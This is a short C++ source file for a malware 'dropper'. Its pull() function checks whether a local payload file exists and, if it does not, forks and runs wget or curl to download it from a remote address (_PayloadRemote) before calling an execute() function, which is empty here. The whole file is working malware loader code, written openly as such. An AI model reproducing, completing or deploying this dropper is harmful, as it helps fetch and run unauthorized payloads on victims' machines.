#include "dropper.h"

int pull()
{
	fprintf(stdout, "[Dropper called]");

	bool payloadExists = fileExists(_PayloadLocal);

	fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);

	if(!payloadExists)
		download();
	
	execute();

	return 0;
}

//NOTE Only checks for accessibility, not existance.
bool fileExists(std::string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0);
}

void download()
{
	std::vector<const char*> webclients = 
	{
			"/usr/bin/wget",
		   	"/usr/bin/curl"
	};


	for(size_t i = 0; i < webclients.size(); i++)
	{
		if(fileExists(webclients[i]))
		{
				std::cout << "Found webclient: " << webclients[i] << std::endl;
				
				int pid = fork();

				if(pid == 0)
					execl(webclients[i], "wget", 
										 (i == 0) ? "-q" : "-sS",
										 (i == 0) ? "-O" : "-o",
										 _PayloadLocal.c_str(), 
										 _PayloadRemote.c_str(),
										 NULL);

				break;
		}
	}
}

void execute()
{

}
